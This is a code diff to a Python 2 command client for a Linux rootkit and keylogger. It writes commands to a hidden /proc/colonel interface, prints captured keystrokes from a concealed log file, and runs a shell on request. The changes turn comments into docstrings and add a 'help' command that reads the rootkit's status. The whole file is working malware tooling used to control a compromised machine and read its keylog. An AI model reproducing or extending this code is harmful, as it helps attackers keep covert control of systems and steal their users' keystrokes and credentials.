@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-# Sends commands to the rootkit.
 import os
 import sys
 sys.path.append(os.path.abspath(os.path.dirname(__file__) + '/' + 'irc'))
@@ -9,15 +8,22 @@ from os import getpid, execl
 evlog = "/opt/__col_log/evlog.txt"
 
 
-# Opens and writes commands to /proc/colonel.
 def command(c):
+	""" Opens and writes commands to /proc/colonel. """
 	f = open("/proc/colonel", "w")
 	f.write(c)
 	f.close()
 
 
-# Translate and print the keylog to console.
+def root_help():
+	""" Prints accepted root commands and status. """
+	f = open("/proc/colonel", "r")
+	doc = f.read()
+	f.close()
+	print doc
+
 def keylogs():
+	""" Translate and print the keylog to console. """
 	log = open(evlog, 'r')
 	f = log.read()
 	log.close()
@@ -26,14 +32,17 @@ def keylogs():
 
 
 def main():
+	""" Sends commands to the rootkit or keylogger via /proc/colonel. """
 	if len(sys.argv[:]) <= 1 or os.geteuid() != 0:
 		print "usage: sudo %s <command>" % sys.argv[0]
 	# will open a shell given the correct command.
 	elif len(sys.argv[:]) > 2:
 		execl(sys.argv[2], "")
 	elif len(sys.argv[:]) > 1:
-		if sys.argv[1] == "keylog":
+		if "keylog" == sys.argv[1]:
 			keylogs()
+		elif "help" == sys.argv[1]:
+			root_help()
 		else:
 			command(sys.argv[1])
 
